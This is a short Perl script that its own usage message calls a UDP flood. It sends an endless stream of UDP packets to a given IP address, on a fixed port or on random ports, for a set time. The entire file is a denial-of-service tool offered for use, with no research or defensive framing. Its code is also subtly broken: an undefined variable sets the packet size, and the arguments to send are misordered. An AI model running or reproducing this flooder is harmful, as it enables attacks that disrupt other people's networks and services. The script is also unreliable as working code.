#!/usr/bin/perl


use Socket;

$ARGC=@ARGV;

if ($ARGC !=3) {
 printf "To initiate UDP Flood\n";
 printf "perl $0 ip port time\n";
 exit(1);
}

my ($ip,$port,$size,$time);
 $ip=$ARGV[0];
 $port=$ARGV[1]; 
 $time=$ARGV[2];

socket(crazy, PF_INET, SOCK_DGRAM, 17);
    $iaddr = inet_aton("$ip");

printf "~UDP Flooding~ $ip on port $port\n";

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
 goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
 system("(sleep $time;killall -9 udp) &");
 goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
 goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
 system("(sleep $time;killall -9 udp) &"); 
 goto randpackets;
}

packets:
for (;;) {
 $size=$rand x $rand x $rand;
 send(crazy, 0, $size, sockaddr_in($port, $iaddr));
} 

randpackets:
for (;;) {
 $size=$rand x $rand x $rand;
 $port=int(rand 65000) +1;
 send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}